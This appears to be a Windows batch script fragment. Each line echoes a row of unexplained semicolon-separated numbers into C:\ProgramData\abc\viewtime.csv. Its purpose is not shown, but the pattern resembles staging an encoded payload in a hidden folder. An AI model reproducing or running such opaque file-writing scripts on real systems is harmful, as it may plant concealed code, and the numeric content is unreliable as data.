>> "C:\ProgramData\abc\viewtime.csv" echo(2.60;0.0526;772.139;840.36;828.7;6685.40;0.672;3.765;8.8401;676.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(676.36;396.68;8863.839;68.436;64.672;139.3775;908.72;839.140;436.128;0876.77;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;232.836;37.1469;30.0;839.68;636.64;4316.372;139.676;36.696;72.4559;
>> "C:\ProgramData\abc\viewtime.csv" echo(829.225;955.15;30.0;7681.472;3.893;137.768;36.3626;804.199;468.36;732.4;
>> "C:\ProgramData\abc\viewtime.csv" echo(2253.60;0.70;68.839;76.8157;736.104;576.139;668.36;6252.696;72.839;84.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(112.7120;672.139;840.36;828.7;0463.40;0.932;29.952;255.5262;955.184;41.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;4472.572;105.892;179.52;0.5265;50.72;839.140;736.128;1090.57;0.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.53;65.6619;48.72;839.208;572.139;9795.840;36.828;7.40;0.5111;932.37;
>> "C:\ProgramData\abc\viewtime.csv" echo(437.0;60.139;0326.768;36.764;68.839;192.8858;572.139;848.36;852.0;5887.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.472;139.576;36.8378;496.232;920.32;40.0;7525.884;1.30;0.50;72.1061;
>> "C:\ProgramData\abc\viewtime.csv" echo(805.192;894.2;60.0;7677.372;139.840;36.828;7.7299;60.0;772.3;365.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(2328.772;139.908;72.839;140.6945;336.128;67.0;50.232;5925.928;36.40;0.899;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.5960;636.32;532.0;50.0;4221.368;139.776;36.804;76.6245;839.68;336.96;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.139;0829.584;36.812;72.839;140.7029;536.128;57.0;60.232;0857.844;251.955;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.884;1.3174;60.0;60.72;805.192;4705.906;2.60;0.372;139.9814;840.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(828.7;30.0;4472.672;3.365;8.772;139.0929;908.72;839.140;536.128;5778.47;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;232.852;36.0150;30.0;676.139;468.36;2870.820;72.841;148.736;160.2030;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;60.72;839.140;8108.436;128.57;0.30;232.5801;662.2;60.0;668.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(2710.776;36.364;76.839;68.1553;336.96;372.139;584.36;1296.812;72.839;140.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(128.1615;77.0;30.232;518.10;4135.70;0.884;1.30;0.0784;40.72;805.192;
>> "C:\ProgramData\abc\viewtime.csv" echo(935.2;5154.60;0.472;139.840;36.7623;828.7;40.0;472.3;4945.465;8.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.908;72.4669;839.140;636.128;37.0;1661.30;232.658;36.70;0.7001;844.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(71.0;70.0;3614.672;105.892;248.32;0.9105;60.72;839.140;636.128;5230.57;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;72.73;65.0679;38.72;839.208;772.139;2999.840;36.828;7.40;0.8839;
>> "C:\ProgramData\abc\viewtime.csv" echo(932.17;636.0;30.72;3259.839;76.436;120.472;139.2787;832.36;828.7;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(4716.955;144.852;0.70;0.5991;672.139;840.36;836.0;7513.40;0.572;139.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.5042;828.7;70.0;955.80;4417.680;72.839;140.736;128.8072;60.0;70.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.132;0746.536;128.57;0.40;255.4593;680.80;372.139;368.36;3576.472;72.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.636;80.8019;933.239;951.255;955.131;7713.824;36.392;0.817;41.9362;884.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.0;40.72;5163.805;192.618;3.40;0.7507;672.139;840.36;828.7;3005.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.472;3.765;8.9453;672.139;908.72;839.140;9791.336;128.47;0.30;232.1432;
>> "C:\ProgramData\abc\viewtime.csv" echo(854.35;40.0;844.72;8348.829;196.812;7.60;0.5732;395.195;472.137;784.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(5824.416;72.837;76.736;8.4438;672.131;936.88;672.139;8971.568;36.804;72.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.8494;436.56;672.139;568.36;6098.756;15.883;0.361;77.7680;590.0;40.116;
>> "C:\ProgramData\abc\viewtime.csv" echo(37.51;0890.892;233.714;1.70;0.0921;772.139;568.36;456.72;3805.499;64.560;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;76.5761;436.104;372.3;900.72;7423.839;193.772;137.668;36.2383;348.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.68;736.48;6954.829;56.680;69.40;0.3609;816.7;451.192;933.225;6889.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.30;72.839;68.4397;736.48;615.183;464.4;4273.361;100.834;0.40;116.0410;
>> "C:\ProgramData\abc\viewtime.csv" echo(47.51;892.233;902.0;7710.50;0.884;8.30;0.6610;40.72;807.192;73.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(0082.839;76.336;48.472;139.3412;832.1;836.0;50.0;0269.672;137.368;36.440;
>> "C:\ProgramData\abc\viewtime.csv" echo(131.8441;824.36;740.0;816.7;8038.831;124.736;44.40;117.0554;37.51;892.233;
>> "C:\ProgramData\abc\viewtime.csv" echo(854.0;9775.50;0.839;68.336;40.5184;372.139;576.36;804.72;7775.63;200.672;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.893;72.8373;837.68;636.64;839.68;0194.636;44.651;210.885;12.9099;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.72;947.241;8234.837;68.736;32.884;1.3647;40.0;70.72;805.192;3814.458;
>> "C:\ProgramData\abc\viewtime.csv" echo(3.50;0.672;139.8875;376.36;396.72;73.65;4687.68;76.839;76.536;64.5959;
>> "C:\ProgramData\abc\viewtime.csv" echo(768.139;468.36;732.72;3790.839;208.672;139.376;36.3127;596.232;856.34;50.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(5859.576;139.568;36.804;139.3918;684.36;332.72;839.76;8912.536;64.472;139.368;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.4925;596.255;844.160;70.0;6029.40;133.892;117.54;51.5289;892.235;739.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(61.0;3269.40;0.372;105.892;114.6022;33.0;40.72;839.76;7870.536;96.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(3.665;8.5565;472.139;908.72;839.76;2584.736;96.932;89.634;0.4646;50.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(31.0;60.0;3986.772;131.896;88.895;204.3766;904.204;904.204;904.204;7495.904;
>> "C:\ProgramData\abc\viewtime.csv" echo(204.904;204.904;204.7953;904.204;376.137;668.36;8296.524;72.837;84.536;16.3077;
>> "C:\ProgramData\abc\viewtime.csv" echo(672.137;676.36;48.72;2593.829;236.884;0.30;0.2427;765.185;64.0;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(4934.665;184.50;48.60;0.9514;886.0;316.0;70.51;7034.901;72.839;132.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(192.0834;50.0;60.255;680.48;9082.672;137.368;36.572;72.2516;831.124;636.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.117;2895.447;184.71;0.50;0.3382;572.105;892.8;36.0;4379.30;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(140.636;192.7608;40.0;30.72;33.65;8021.48;72.839;208.672;139.0558;840.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(892.0;70.0;0610.932;215.633;0.60;51.7583;892.233;914.3;30.0;1300.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.568;36.772;72.4316;837.68;736.56;572.139;2570.832;36.900;0.40;0.0885;
>> "C:\ProgramData\abc\viewtime.csv" echo(831.184;876.6;70.0;7513.60;116.718;72.839;68.3335;436.72;472.5;50.2;
>> "C:\ProgramData\abc\viewtime.csv" echo(9212.50;0.772;137.468;36.9988;820.235;79.72;899.68;5777.336;120.70;0.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.7367;772.139;668.36;820.72;2303.837;68.736;64.472;139.9752;668.36;372.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(55.128;4816.32;0.40;72.837;132.7685;336.128;40.0;40.72;8199.839;68.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.472;5.5226;828.4;50.0;672.137;2666.832;36.836;0.30;0.2735;772.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;900.0;0701.50;0.365;184.50;2.2787;50.0;672.139;908.72;9468.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(76.436;56.932;31.7021;429.0;50.72;831.124;3762.436;64.70;116.434;72.9486;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.132;436.200;70.0;5307.50;72.55;0.62;0.0443;60.65;884.128;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(3684.60;72.839;208.472;139.1906;776.36;564.232;946.28;1514.50;0.844;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.0171;736.56;472.139;840.36;7726.908;0.70;0.372;137.0494;572.48;672.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(668.36;0942.656;72.839;76.536;64.0073;372.137;836.152;40.0;3514.30;51.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(102.837;68.6248;736.48;715.183;768.36;4391.648;72.839;140.336;200.3465;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.15;883.132;5935.565;128.42;0.40;133.7862;892.116;615.15;883.68;4834.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(48.802;255.892;102.9297;837.68;536.48;935.216;9415.651;192.802;137.568;36.6016;
>> "C:\ProgramData\abc\viewtime.csv" echo(652.15;883.68;336.52;8635.372;139.840;36.900;0.3885;50.0;615.183;832.65;
>> "C:\ProgramData\abc\viewtime.csv" echo(3365.836;4.50;0.833;192.5287;816.15;515.183;768.36;1492.452;102.955;192.802;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.6197;368.36;652.235;916.15;8943.883;68.436;48.955;192.3389;372.152;472.209;
>> "C:\ProgramData\abc\viewtime.csv" echo(924.72;1937.839;140.336;200.40;0.6071;60.72;829.193;828.2;6052.30;0.776;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.892;72.9895;839.209;472.139;840.36;2200.828;0.30;0.932;71.2994;628.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.15;883.68;1107.636;52.955;192.772;152.0124;672.209;924.72;839.140;3805.436;
>> "C:\ProgramData\abc\viewtime.csv" echo(200.50;0.30;72.4405;829.193;836.4;60.0;1676.476;139.892;72.839;209.9689;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.139;840.36;836.0;3759.70;0.932;25.528;0.7896;40.72;839.68;536.56;
>> "C:\ProgramData\abc\viewtime.csv" echo(6503.572;131.892;72.772;137.6809;368.36;796.72;839.68;1433.536;56.372;131.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(88.0513;672.137;368.36;804.72;1799.839;68.336;96.772;139.7078;840.36;828.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;3657.372;137.772;8.615;183.7184;468.36;448.72;909.224;7270.572;139.776;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.596;102.9834;837.1;615.183;668.36;6352.348;255.892;72.852;72.9053;909.224;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.139;576.36;2225.696;102.837;65.72;72.0566;839.68;336.104;572.139;8999.840;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.836;0.60;0.5504;672.137;472.8;315.183;9581.668;36.452;72.909;224.4485;
>> "C:\ProgramData\abc\viewtime.csv" echo(672.139;676.36;804.102;9293.837;1.715;183.368;36.2520;552.255;892.72;852.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(1751.909;224.572;139.376;36.0758;804.102;837.65;72.72;0697.831;124.636;64.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(116.8188;580.72;839.68;536.64;4715.472;137.568;36.688;72.7311;839.68;336.56;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.5;6215.860;0.60;0.772;137.6044;768.36;480.72;839.68;7458.636;88.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.676;36.9158;680.72;837.8;672.139;4271.768;36.488;72.839;76.6293;336.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.137;772.8;6209.472;139.368;36.380;72.3877;839.76;736.88;472.137;2966.48;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;68.336;80.0730;672.139;576.36;688.72;1432.837;72.78;232.784;224.2372;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.255;472.137;768.36;9527.812;72.839;68.636;112.4631;672.131;892.16;672.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(9987.832;36.844;0.40;0.1356;772.139;468.36;812.72;8718.831;192.732;72.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.1537;336.152;60.0;60.72;1087.839;68.636;112.372;131.6667;892.48;572.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;3022.860;0.50;0.672;139.7971;584.36;756.72;839.140;7189.636;144.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.60;232.8073;838.245;955.255;672.139;6719.468;36.656;72.831;192.7016;416.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.208;472.139;6460.840;36.852;0.60;0.3711;932.113;945.255;955.72;4505.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.736;56.372;131.7885;892.32;372.139;908.72;6623.839;140.436;160.50;0.8920;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.232;788.245;955.255;7789.884;1.50;0.40;72.3640;805.192;637.6;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(7787.672;139.840;36.892;0.1695;40.0;372.3;465.8;0218.576;139.376;36.664;
>> "C:\ProgramData\abc\viewtime.csv" echo(76.9263;839.68;736.56;572.139;6498.908;72.839;140.636;192.2271;30.0;40.232;
>> "C:\ProgramData\abc\viewtime.csv" echo(882.30;3527.30;0.572;139.832;36.4924;900.0;40.0;372.5;5181.836;4.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.772;139.4376;840.36;900.0;50.0;5526.672;139.837;184.76;0.4664;70.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.76;436.32;8672.772;139.840;36.900;0.6650;40.0;368.139;837.180;3709.66;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.50;76.839;192.3486;672.139;384.36;656.72;4451.839;140.636;192.50;0.6602;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.232;844.239;955.255;8766.472;139.832;36.900;0.1354;40.0;376.139;836.192;
>> "C:\ProgramData\abc\viewtime.csv" echo(9777.36;0.40;76.839;132.0840;336.208;60.0;50.72;7784.839;84.636;56.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.9739;840.36;892.0;60.0;5561.932;7.938;255.955;72.7664;839.132;736.200;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;2123.30;76.839;136.900;6.1255;30.0;372.139;832.36;5077.900;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.468;139.7620;828.152;56.0;60.72;2734.839;148.436;208.60;0.2416;70.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.140;436.192;2720.40;0.70;232.320;241.1653;955.255;372.139;848.36;1682.908;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;0.472;139.8388;840.36;892.0;50.0;7350.932;111.950;255.955;184.2938;
>> "C:\ProgramData\abc\viewtime.csv" echo(51.0;60.0;472.129;3946.896;184.70;0.50;195.8375;904.204;772.137;484.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(6894.616;72.837;76.736;8.7577;572.131;936.104;665.184;1404.40;16.50;0.351;
>> "C:\ProgramData\abc\viewtime.csv" echo(210.0945;772.139;676.36;820.232;6862.432;26.70;0.772;184.5754;800.105;815.111;
>> "C:\ProgramData\abc\viewtime.csv" echo(814.100;6715.801;114.372;137.468;36.9421;656.65;884.8;40.0;8265.40;72.841;
>> "C:\ProgramData\abc\viewtime.csv" echo(84.336;56.9108;472.139;776.36;820.232;9388.824;25.40;0.884;1.4552;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.72;807.192;7110.716;72.839;76.536;120.9241;572.3;900.72;839.193;6091.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.568;36.532;72.4615;899.68;536.48;60.0;7163.60;0.884;1.40;0.4180;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.72;805.192;922.6;0261.40;0.672;139.476;36.2489;812.72;33.65;78.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(6447.839;192.472;141.484;36.6422;648.72;839.76;636.112;9010.932;131.922;255.955;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.4401;899.68;536.40;50.0;0200.70;0.884;1.40;0.5363;70.72;805.192;
>> "C:\ProgramData\abc\viewtime.csv" echo(932.6;5817.70;0.372;139.476;36.8241;812.72;43.65;58.76;1305.839;192.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(141.784;36.4789;540.72;839.76;436.112;3513.932;83.922;255.955;184.6854;31.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;372.105;5499.892;243.46;0.30;72.8283;839.76;536.112;372.3;6545.365;
>> "C:\ProgramData\abc\viewtime.csv" echo(8.572;139.908;72.6520;839.76;436.40;572.139;5701.568;36.812;255.580;40.3822;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.137;768.36;664.51;8971.901;255.584;36.364;72.2950;837.68;536.72;884.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(1363.50;0.30;72.805;192.3988;949.6;70.0;772.139;9050.576;36.812;72.53;
>> "C:\ProgramData\abc\viewtime.csv" echo(65.2813;78.72;839.208;472.139;6426.376;36.740;72.839;68.6121;436.112;955.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(640.185;0038.664;0.60;0.672;107.7435;901.0;572.139;584.36;6894.332;72.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(4.310;184.4587;464.0;30.0;572.107;2048.892;0.572;139.776;36.0470;532.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(899.68;31.8;0010.73;0.30;0.884;64.5646;60.0;30.72;807.192;7577.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;76.436;32.7542;372.3;900.72;839.193;2573.885;8.70;0.50;72.7261;
>> "C:\ProgramData\abc\viewtime.csv" echo(807.201;31.72;841.21;5662.872;28.40;0.772;137.2416;484.8;316.184;31.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(4995.70;0.672;105.892;11.2645;57.0;60.72;839.76;1023.636;112.772;3.365;
>> "C:\ProgramData\abc\viewtime.csv" echo(8.7015;472.139;908.72;839.76;4497.436;48.772;139.768;36.8141;812.255;380.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(885.64;6467.40;0.40;72.807;201.1663;31.72;839.84;736.32;2013.372;137.64;
>> "C:\ProgramData\abc\viewtime.csv" echo(10.884;64.0428;50.0;50.72;807.192;2644.51;72.839;76.536;32.1259;572.199;
>> "C:\ProgramData\abc\viewtime.csv" echo(568.1;38.4;9228.30;0.70;184.764;0.1293;60.0;672.107;892.1;2419.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.476;36.632;72.8650;53.200;772.139;893.185;3295.78;0.60;0.572;107.1182;
>> "C:\ProgramData\abc\viewtime.csv" echo(901.0;372.139;584.36;8988.672;72.837;84.38;16.1311;472.199;468.36;480.2;
>> "C:\ProgramData\abc\viewtime.csv" echo(4667.60;0.60;184.364;0.9312;70.0;772.107;892.1;2691.472;139.476;36.332;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.7777;53.200;672.139;893.185;6330.68;0.60;0.372;107.6641;901.1;372.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(684.36;0951.380;72.837;84.38;16.1849;884.64;40.0;40.72;3298.807;192.61;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;76.8004;636.32;572.3;900.72;0758.839;193.885;8.70;0.2517;30.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(807.201;32.72;4029.841;21.922;27.30;0.9068;472.137;684.8;316.72;6432.831;
>> "C:\ProgramData\abc\viewtime.csv" echo(196.804;195.904;204.6948;904.204;476.137;376.36;1970.632;76.837;68.736;24.1440;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.137;584.36;316.72;9223.837;76.736;8.772;131.9596;936.72;884.1;50.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(2619.50;72.807;192.58;72.1789;839.76;736.88;772.3;6039.900;72.839;193.665;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.3431;38.0;40.0;451.210;8372.372;139.900;232.896;23.9331;70.0;884.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;8361.60;72.807;192.316;72.8140;839.76;736.88;572.3;7454.900;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(193.772;137.9917;768.36;632.184;464.0;9685.50;0.472;107.892;2.7144;672.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(376.36;632.72;1452.839;84.636;80.672;139.4893;682.120;472.137;420.1;1185.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(64.30;0.30;72.1143;807.192;32.72;839.76;1773.436;32.472;199.568;1.6279;
>> "C:\ProgramData\abc\viewtime.csv" echo(38.6;60.0;40.184;9350.764;0.40;0.772;107.8994;892.2;572.139;676.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(4410.432;72.63;200.472;139.0673;893.185;38.0;30.0;8868.672;107.901;0.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.9537;384.36;804.72;837.84;8027.38;16.372;199.368;36.8771;748.4;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.184;3024.464;0.70;0.672;107.1281;892.2;672.139;476.36;7420.432;72.43;
>> "C:\ProgramData\abc\viewtime.csv" echo(200.572;139.5998;893.185;58.0;30.0;4330.772;107.901;1.772;139.6109;584.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(548.72;837.84;1912.38;16.884;64.30;0.5532;70.72;807.192;72.72;4498.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(76.336;32.472;3.8157;900.72;839.193;885.8;4103.30;0.30;72.807;201.2539;
>> "C:\ProgramData\abc\viewtime.csv" echo(45.72;839.84;536.96;8260.772;137.584;8.516;69.0906;751.192;772.139;684.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(0448.732;72.841;13.888;26.3583;60.0;472.139;568.36;9690.780;255.844;168.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.8903;40.72;837.68;336.40;6357.372;139.676;36.740;72.2502;839.68;736.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.144;6529.876;0.70;0.351;210.6206;472.139;476.36;540.72;0706.839;68.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(80.955;144.0661;884.0;70.0;572.139;8928.676;36.640;72.839;68.4951;536.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.144;892.0;1870.30;0.844;72.831;196.4112;472.195;904.204;904.204;4054.368;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.776;36.432;76.8997;837.68;636.24;772.137;8285.484;36.516;72.837;76.1504;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.8;772.131;936.56;3929.884;1.50;0.30;72.7476;807.192;68.72;839.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(4883.436;72.472;3.900;72.1935;839.193;665.184;68.0;0818.60;0.351;210.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.1252;900.232;800.22;40.0;8351.884;1.30;0.70;72.7541;807.192;616.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.76;8128.436;72.772;3.900;72.5971;839.193;472.137;668.36;6191.632;184.664;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.50;0.2295;372.107;892.2;372.139;1564.776;36.732;72.839;84.7115;536.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.137;320.1;2707.884;64.40;0.70;72.1454;807.192;42.72;839.76;0429.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(32.672;199.368;1.9705;78.4;50.0;30.184;7131.764;0.40;0.572;107.8612;
>> "C:\ProgramData\abc\viewtime.csv" echo(892.2;472.139;476.36;7513.632;72.43;200.672;139.8158;893.185;48.0;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(3497.372;107.901;0.372;139.1001;384.36;364.72;839.82;1504.424;72.837;84.58;
>> "C:\ProgramData\abc\viewtime.csv" echo(16.3149;884.64;50.0;40.72;7284.807;192.32;72.839;76.7785;436.32;572.3;
>> "C:\ProgramData\abc\viewtime.csv" echo(900.72;9859.839;193.885;8.30;0.5405;60.72;807.201;41.72;0368.839;84.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(64.372;139.8633;582.40;672.137;584.8;8351.616;184.764;0.60;0.2757;472.107;
>> "C:\ProgramData\abc\viewtime.csv" echo(892.2;472.139;4338.576;36.632;72.53;200.7098;572.139;893.185;58.0;7277.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.372;107.901;2.1168;572.139;784.36;580.72;4214.837;84.58;16.839;68.8045;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.88;831.192;44.139;6086.892;72.839;76.336;64.0571;472.139;573.16;572.3;
>> "C:\ProgramData\abc\viewtime.csv" echo(5491.900;72.839;193.885;64.6817;70.0;40.72;807.201;5635.52;72.839;84.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(32.4095;772.3;909.72;839.202;8234.886;8.50;0.40;72.2842;807.210;73.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.68;8078.717;16.469;51.892;72.1584;839.84;536.32;372.141;4677.313;39.725;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;72.4606;839.68;436.64;955.144;0438.868;0.70;0.672;137.2302;568.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(540.184;764.0;7747.50;0.472;107.892;2.6734;885.1;30.0;70.72;1669.805;
>> "C:\ProgramData\abc\viewtime.csv" echo(201.323;7.60;0.6274;572.139;784.36;464.72;0557.43;74.48;72.839;84.3214;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.32;476.139;676.2;1012.38;76.839;68.336;80.0890;672.139;909.72;839.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(6020.336;64.932;189.624;0.7483;30.72;839.76;536.40;4411.672;139.468;36.564;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.4142;844.176;30.0;60.51;9337.910;72.839;76.336;40.4607;772.139;668.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(364.255;0158.844;184.70;0.30;72.7318;839.76;336.40;572.139;3963.768;36.764;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.844;192.1805;50.0;60.144;372.131;0646.896;56.895;204.904;204.2488;904.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(668.137;676.36;1252.332;76.837;68.436;24.1008;472.137;384.36;616.72;7014.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(76.636;8.772;131.8562;936.72;884.1;50.0;3583.40;72.807;192.48;72.1994;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.76;336.88;372.3;2734.900;72.839;193.565;184.2195;58.0;70.0;351.210;
>> "C:\ProgramData\abc\viewtime.csv" echo(9727.372;139.900;232.848;20.0336;30.0;884.1;70.0;2020.30;72.807;192.316;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.5494;839.76;536.88;772.3;6271.900;72.839;193.372;137.1425;368.36;632.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(664.0;2526.70;0.572;107.892;2.6858;372.139;376.36;732.72;8194.839;84.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(80.372;139.7882;382.112;772.137;620.1;5134.884;64.50;0.70;72.2680;807.192;
>> "C:\ProgramData\abc\viewtime.csv" echo(42.72;839.76;3271.436;32.572;199.768;1.7279;68.4;70.0;30.184;7593.664;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;0.472;107.9206;892.2;372.139;776.36;0786.532;72.63;200.372;139.1591;
>> "C:\ProgramData\abc\viewtime.csv" echo(893.185;58.0;50.0;7284.772;107.901;0.472;139.9654;584.36;396.72;837.84;
>> "C:\ProgramData\abc\viewtime.csv" echo(6136.68;16.772;199.468;36.1541;448.0;51.0;30.184;7994.464;0.30;0.572;
>> "C:\ProgramData\abc\viewtime.csv" echo(107.6689;892.2;372.139;676.36;5322.532;72.33;200.572;139.0728;893.185;68.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.0;0920.772;107.901;1.572;139.5887;484.36;548.72;837.84;7926.78;16.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(64.60;0.2915;50.72;807.192;32.72;9731.839;76.736;32.472;3.5921;900.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.193;885.8;0215.50;0.70;72.807;201.1253;72.139;484.36;804.72;2808.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(84.38;16.884;64.7613;70.0;30.72;807.192;5804.52;72.839;76.436;32.2761;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.3;900.72;839.193;0521.885;8.70;0.70;72.5821;807.201;43.72;841.84;
